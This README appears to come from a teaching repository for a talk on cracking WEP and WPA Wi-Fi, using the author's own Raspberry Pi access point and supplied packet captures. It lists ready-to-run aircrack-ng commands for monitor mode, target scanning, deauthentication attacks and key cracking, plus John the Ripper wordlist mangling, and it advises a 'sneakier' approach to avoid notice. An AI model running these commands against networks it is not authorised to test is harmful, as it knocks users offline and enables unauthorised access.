HackerietWifi
=============

Recently I gave a very simple introduction to breaking wireless networks. My aim was
to give people an idea how it's done. I focused on WEP and WPA networks as they are still 
the most common networks found out there. 

For the wireless access point, I used a Raspberry Pi with a Edimax USB dongle on the hardware
side. For software, I used hostapd to get a simple wireless network up and running. The configuration
files for this can be found in the Configs directory. I also used a DHCP server on the Pi to 
ensure that clients connecting to my wireless network were given IP addresses. I could have also
provided network connectivity, but alas I was controlling the Pi over the ethernet connection. 

The packet captures for the WEP and WPA networks are available for cracking in the Pcaps directory.
The initial wordlist for the WPA network is also available but will not work properly with the 
tools without a little manipulation. 

Please note that the commands listed here are just a starting point. There is definitely a quicker
and more efficient way to do this. So check the command options and do a little research :)


Tools used: 
-----------


Aircrack-ng Suite : http://www.aircrack-ng.org

 - airmon-ng
 - airodump-ng
 - aircrack-ng
 - aireplay-ng


John the Ripper: http://www.openwall.com/john/


Snooping on wireless networks
-----------------------------

1. Enable a monitoring interface on your wireless NIC
 
```
airmon-ng start wlan1
```

2. Check that your card support packet injection

```
 aireplay-ng --test mon0 
```

3. Check what wireless networks are out there (find our targets)

```
 airodump-ng mon0
```


WEP Networks
------------

Following from the steps above...

4. Home in on our target network and start saving packets for cracking later

```
 airodump-ng --bssid 00:1F:1F:A8:9D:34 --channel 1 mon0 -w packetcapture.pcap
```

5. Run a "deauth" attack to knock client off the target network
 
```
 aireplay-ng --deauth 10 -a 00:1F:1F:A8:9D:34 --channel 1 mon0 
```


You can either continue to do this and probably get noticed, or shift your attack
to something a little sneakier. Either way you will want to get as much data as you 
can in order to crack the password.

6. Crack that password
 
```
 aircrack-ng -a 1 packetcapture.pcap
```


Wordlists
---------

Our initial wordlist (wordlist.txt) is probably not quite up to scratch, but with a little
manipulation from John, it may be more useful. 

```
 john --wordlist=wordlist.txt --rules --stdout > new_superleet_wordlist.txt
```


WPA Networks 
------------

Pretty much the same as above, except you will just need to deauth a client in order to 
capture that four way handshake that happens with the WPA authentication process.
If you look in the top right corner of the airodump-ng window, you should see that you've
successfully captured the handshake.

After that it's up to having either a good wordlist or decent rainbow tables.
Without those, you will be in trouble...


```
 aircrack-ng -a 2 -w new_superleet_wordlist.txt wpa_packetcapture.pcap
```


That's all there is to it really. 

If there are any questions, comments or ideas on this...please get in touch.


